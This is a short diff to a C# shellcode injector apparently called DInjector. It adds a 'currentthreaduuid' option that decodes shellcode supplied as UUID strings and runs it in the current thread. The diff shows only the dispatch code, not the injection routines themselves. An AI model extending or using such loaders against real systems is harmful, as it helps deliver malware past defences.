@@ -94,6 +94,10 @@ namespace DInjector
                 case "currentthread":
                     CurrentThread.Execute(shellcodeBytes);
                     break;
+                case "currentthreaduuid":
+                    string shellcodeUuids = System.Text.Encoding.UTF8.GetString(shellcodeBytes);
+                    CurrentThreadUuid.Execute(shellcodeUuids);
+                    break;
                 case "remotethread":
                     RemoteThread.Execute(
                         shellcodeBytes,
